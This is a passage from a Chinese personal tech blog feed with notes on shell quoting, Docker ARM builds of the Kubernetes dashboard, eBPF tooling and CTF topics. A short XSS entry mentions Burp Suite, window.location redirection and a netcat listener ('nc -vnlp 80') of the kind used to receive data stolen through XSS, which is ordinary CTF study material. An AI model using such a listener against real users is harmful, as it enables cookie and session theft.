class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg<br>12<br>34<br>anaconda-ks.cfg<br>56<br>78<br><br><br><br></code></pre></td></tr></table></figure><h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 脚本</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## 执行</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span> <br><span class="hljs-keyword">done</span><br>anaconda-ks.cfg 12 34<br>anaconda-ks.cfg 56 78<br><br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="4"><a href="#4" class="headerlink" title="4"></a>4</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">## 脚本</span><br>lines=(<br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br><br><br><span class="hljs-comment">## 执行</span><br><span class="hljs-comment"># ll</span><br>total 4<br>-rw------- 1 root root 1805 Jul  7 18:07 anaconda-ks.cfg<br><span class="hljs-comment"># lines=(</span><br><span class="hljs-string">&quot;* 12 34&quot;</span><br><span class="hljs-string">&quot;* 56 78&quot;</span><br>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;lines[@]&#125;</span>&quot;</span><br><span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> <br><span class="hljs-keyword">done</span><br>* 12 34<br>* 56 78<br></code></pre></td></tr></table></figure><h1 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;* 12 23&quot;</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$var</span>和<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$var</span>&quot;</span>为什么输出不一样?<br></code></pre></td></tr></table></figure><p><code>echo $var</code> 和 <code>echo &quot;$var&quot;</code> 之所以输出不一样，是因为它们在处理变量时对空白字符（空格、制表符、换行符等）的方式不同。在Shell中，双引号 <code>&quot;</code> 和不使用引号之间的差异是关键。</p><ol><li><p><code>echo $var</code>: 当您使用 <code>echo $var</code> 时，Shell会对变量进行参数扩展（Word Splitting）。这意味着空白字符被用作分隔符，将变量的值分割成多个参数，然后将这些参数传递给<code>echo</code>命令。在这种情况下，<code>$var</code> 中的空白字符将被用作分隔符，所以 <code>*</code>、<code>12</code> 和 <code>23</code> 会被视为不同的参数，而不是单个参数。</p></li><li><p><code>echo &quot;$var&quot;</code>: 当您使用 <code>echo &quot;$var&quot;</code> 时，双引号将变量的值视为一个整体，不会进行参数扩展。因此，<code>$var</code> 中的空白字符保持不变，作为一个整体传递给<code>echo</code>命令，所以输出将是 <code>* 12 23</code>，而不是分解成多个参数。<br>这个差异在处理包含空白字符的字符串时非常重要，因为它影响到如何处理字符串中的空白字符。如果您希望保留字符串中的空白字符并将整个字符串作为一个参数传递给<code>echo</code>或其他命令，您应该使用双引号 <code>&quot;$var&quot;</code> 来引用变量。如果需要将字符串拆分为多个参数，可以不使用引号 <code>echo $var</code>，以便Shell执行参数扩展。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】XSS</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91XSS/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808205604.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808211215.png" alt="image.png"></p><p>Burpsuite：<br>Encoder  将一个url变成url的编码方式<br>Render 渲染</p><p>window.location 重定向</p><p>nc -vnlp 80 监听80端口</p><h1 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup 2"></a>writeup 2</h1><p><a href="https://www.charseki.com/archives/xss-test-platform">XSS Test Platform</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】pwn</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1Pv4y1F73K/?spm_id_from=333.999.0.0&vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818">https://www.bilibili.com/video/BV1Pv4y1F73K/?spm_id_from=333.999.0.0&amp;vd_source=3d4bc6a91e11c12d0e3b57b4e50c9818</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】文件上传漏洞</title>
    <link href="/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/31/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230809203556.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【cue】test2</title>
    <link href="/2023/10/31/cue/%E3%80%90cue%E3%80%91test2/"/>
    <url>/2023/10/31/cue/%E3%80%90cue%E3%80%91test2/</url>
    
    <content type="html"><![CDATA[<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> SelfNodeVariable.regionImageRegistryResolution &#123;<br>       <br>       &#123;<br>           data: <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">           test3.host</span><br><span class="hljs-string">           &quot;&quot;&quot;</span><br>           mode: <span class="hljs-string">&quot;0755&quot;</span><br>           path: <span class="hljs-string">&quot;test&quot;</span><br>       &#125;<br>     &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【docker系列】构建dashboard的arm镜像</title>
    <link href="/2023/10/31/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/"/>
    <url>/2023/10/31/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91%E6%9E%84%E5%BB%BAdashboard%E7%9A%84arm%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">############################ 1.下载仓库 ############################</span><br>[root@ningan ~]<span class="hljs-comment"># pwd</span><br>/root<br><br>[root@ningan ~]<span class="hljs-comment"># git clone https://github.com/kubernetes/dashboard.git</span><br>Cloning into <span class="hljs-string">&#x27;dashboard&#x27;</span>...<br>remote: Enumerating objects: 95919, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (445/445), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (167/167), <span class="hljs-keyword">done</span>.<br>remote: Total 95919 (delta 307), reused 401 (delta 274), pack-reused 95474<br>Receiving objects: 100% (95919/95919), 183.17 MiB | 5.84 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (56815/56815), <span class="hljs-keyword">done</span>.<br><br><span class="hljs-comment">############################ 2.找到main函数 ############################</span><br>[root@ningan ~]<span class="hljs-comment"># cd dashboard</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># git checkout v2.4.0</span><br>Note: checking out <span class="hljs-string">&#x27;v2.4.0&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by performing another checkout.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -b with the checkout <span class="hljs-built_in">command</span> again. Example:<br><br>  git checkout -b &lt;new-branch-name&gt;<br><br>HEAD is now at e75ebcf68 Prepare <span class="hljs-keyword">for</span> v2.4.0 release (<span class="hljs-comment">#6536)</span><br><br>[root@ningan dashboard]<span class="hljs-comment"># ls</span><br>aio           code-of-conduct.md  cypress       docs    go.sum             i18n     license-checker-config.json  OWNERS_ALIASES  package-lock.json  ROLES.md           SECURITY.md  tsconfig.json<br>angular.json  CONTRIBUTING.md     cypress.json  go.mod  gulpfile.babel.js  LICENSE  OWNERS                       package.json    README.md          SECURITY_CONTACTS  src<br>[root@ningan dashboard]<span class="hljs-comment">#</span><br>[root@ningan dashboard]<span class="hljs-comment"># cd src</span><br>[root@ningan src]<span class="hljs-comment"># ls</span><br>app<br>[root@ningan src]<span class="hljs-comment"># cd app/</span><br>[root@ningan app]<span class="hljs-comment"># ls</span><br>backend  frontend<br>[root@ningan app]<span class="hljs-comment"># cd backend/</span><br>[root@ningan backend]<span class="hljs-comment"># ls</span><br>api  args  auth  cert  client  dashboard.go  errors  handler  integration  plugin  resource  scaling  settings  <span class="hljs-built_in">sync</span>  systembanner  validation<br>[root@ningan backend]<span class="hljs-comment">#</span><br><br><br><span class="hljs-comment">############################ 3.编译arm二进制 ############################</span><br>[root@ningan backend]<span class="hljs-comment"># GOOS=linux GOARCH=arm64 go build  -o bin/dashboard-arm ./dashboard.go</span><br>[root@ningan backend]<span class="hljs-comment">#</span><br>[root@ningan backend]<span class="hljs-comment"># cd bin</span><br>[root@ningan bin]<span class="hljs-comment"># ll</span><br>total 49880<br>drwxr-xr-x  2 root root     4096 Jul 13 15:36 ./<br>drwxr-xr-x 18 root root     4096 Jul 13 15:36 ../<br>-rwxr-xr-x  1 root root 51063857 Jul 13 15:36 dashboard-arm*<br><br><br><span class="hljs-comment">############################ 4.编写Dockerfile ############################</span><br>[root@ningan bin]<span class="hljs-comment"># cat Dockerfilearm</span><br>FROM xxx   <span class="hljs-comment"># 此处写成自己的一个arm基础镜像</span><br><br>ADD ./dashboard-arm /dashboard<br>USER root<br>EXPOSE 8443 9090<br>ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br><br><span class="hljs-comment">############################ 5.构建镜像 ############################</span><br>[root@ningan bin]<span class="hljs-comment"># docker build -t dashboard:v2.4.0-arm64 . -f Dockerfilearm</span><br>Sending build context to Docker daemon  51.07MB<br>Step 1/5 : FROM xxx/istio/csm_stg/src_image_build/base_go:1.16<br> ---&gt; 3ad4565d534b<br>Step 2/5 : ADD ./dashboard-arm /dashboard<br> ---&gt; 7e3d77933b5a<br>Step 3/5 : USER root<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in 2d9408e745f1</span><br><span class="hljs-string">Removing intermediate container 2d9408e745f1</span><br><span class="hljs-string"> ---&gt; 177800207a1e</span><br><span class="hljs-string">Step 4/5 : EXPOSE 8443 9090</span><br><span class="hljs-string"> ---&gt; [Warning] The requested image&#x27;</span>s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested<br> ---&gt; Running <span class="hljs-keyword">in</span> 932853d116b3<br>Removing intermediate container 932853d116b3<br> ---&gt; 7ea9c1c8d5e5<br>Step 5/5 : ENTRYPOINT [<span class="hljs-string">&quot;/dashboard&quot;</span>]<br> ---&gt; [Warning] The requested image<span class="hljs-string">&#x27;s platform (linux/arm64/v8) does not match the detected host platform (linux/amd64) and no specific platform was requested</span><br><span class="hljs-string"> ---&gt; Running in ce7ee0cc5586</span><br><span class="hljs-string">Removing intermediate container ce7ee0cc5586</span><br><span class="hljs-string"> ---&gt; e14cdf3553f3</span><br><span class="hljs-string">Successfully built e14cdf3553f3</span><br><span class="hljs-string">Successfully tagged dashboard:v2.4.0-arm64</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">############################ 6.测试 ############################</span><br><span class="hljs-string">启动是可以成功启动了，但是一直重启，也不知道为啥</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>4</title>
    <link href="/2023/10/31/ebpf/04/"/>
    <url>/2023/10/31/ebpf/04/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#### 04节</span><br><span class="hljs-comment">###### bpftool，用它可以查看 eBPF 程序的运行状态</span><br><span class="hljs-comment"># 查询系统中正在运行的 eBPF 程序</span><br>sudo bpftool prog list  <br><span class="hljs-comment"># 导出这个 eBPF 程序的指令</span><br>sudo bpftool prog dump xlated <span class="hljs-built_in">id</span> 89<br><br>sudo bpftool prog dump jited <span class="hljs-built_in">id</span> 89<br><br><br><span class="hljs-comment"># 跟踪系统调用 -ebpf表示只跟踪bpf系统调用</span><br>strace -v -f -ebpf ./hello-opennat.py<br><br>strace -v -f ./hello-opennat.py<br><br><br>用高级语言开发的 eBPF 程序，需要首先编译为 BPF 字节码（即 BPF 指令），然后借助 bpf 系统调用加载到内核中，最后再通过性能监控等接口，与具体的内核事件进行绑定。这样，内核的性能监控模块才会在内核事件发生时，自动执行我们开发的 eBPF 程序。<br><br><br></code></pre></td></tr></table></figure><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br></code></pre></td></tr></table></figure><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="BPF-指令是什么样的？"><a href="#BPF-指令是什么样的？" class="headerlink" title="BPF 指令是什么样的？"></a>BPF 指令是什么样的？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog list</span><br>...<br>170: kprobe  name hello_world  tag 38dd440716c4900f  gpl<br>        loaded_at 2023-01-29T22:53:07+0800  uid 0<br>        xlated 104B  jited 74B  memlock 4096B<br>        btf_id 103<br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump xlated id 170</span><br>int hello_world(void * ctx):<br>; int hello_world(void *ctx)<br>   0: (b7) r1 = 33<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>   1: (6b) *(u16 *)(r10 -4) = r1<br>   2: (b7) r1 = 1684828783<br>   3: (63) *(u32 *)(r10 -8) = r1<br>   4: (18) r1 = 0x57202c6f6c6c6548<br>   6: (7b) *(u64 *)(r10 -16) = r1<br>   7: (bf) r1 = r10<br>;<br>   8: (07) r1 += -16<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // 最常用的 BPF 辅助函数，它的作用是输出一段字符串。不过，由于 eBPF 运行在内核中，它的输出并不是通常的标准输出（stdout），而是内核调试文件 /sys/kernel/debug/tracing/trace_pipe<br>   9: (b7) r2 = 14<br>  10: (85) call bpf_trace_printk<span class="hljs-comment">#-65424</span><br>; <span class="hljs-built_in">return</span> 0;<br>  11: (b7) r0 = 0<br>  12: (95) <span class="hljs-built_in">exit</span><br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump jited id 170</span><br>Error: No libbfd support<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool version -p</span><br>&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;5.15.74&quot;</span>,<br>    <span class="hljs-string">&quot;features&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;libbfd&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&quot;skeletons&quot;</span>: <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="eBPF-程序是什么时候执行的？"><a href="#eBPF-程序是什么时候执行的？" class="headerlink" title="eBPF 程序是什么时候执行的？"></a>eBPF 程序是什么时候执行的？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>strace: <span class="hljs-built_in">exec</span>: Permission denied<br>+++ exited with 1 +++<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># chmod +x hello.py</span><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo strace -v -f -ebpf ./hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>bpf(BPF_BTF_LOAD, &#123;btf=<span class="hljs-string">&quot;\237\353\1\0\30\0\0\0\0\0\0\0\230\2\0\0\230\2\0\0\315\t\0\0\0\0\0\0\0\0\0\2&quot;</span>..., btf_log_buf=NULL, btf_size=3197, btf_log_size=0, btf_log_level=0&#125;, 128) = 3<br>bpf(BPF_PROG_LOAD, &#123;prog_type=BPF_PROG_TYPE_KPROBE, insn_cnt=13, insns=[&#123;code=BPF_ALU64|BPF_K|BPF_MOV, 